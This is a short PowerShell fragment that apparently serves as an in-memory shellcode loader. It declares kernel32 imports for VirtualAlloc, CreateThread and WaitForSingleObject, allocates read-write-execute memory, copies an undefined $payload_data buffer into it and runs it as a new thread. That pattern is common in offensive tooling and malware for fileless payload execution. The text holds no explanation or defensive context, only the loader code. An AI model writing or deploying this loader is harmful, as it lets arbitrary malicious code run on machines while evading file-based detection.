[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices");
$MethodDefinition ='[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(UInt32 a, UInt32 b, IntPtr c, IntPtr d, UInt32 e, UInt32 f);[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); [DllImport("kernel32")] public static extern UInt32 WaitForSingleObject(IntPtr a, UInt32 b);'

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru


[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($byte_length), 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($byte_length));
[IntPtr]$thread = $Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0);
$Kernel32::WaitForSingleObject($thread, [UInt32]"0xFFFFFFFF");
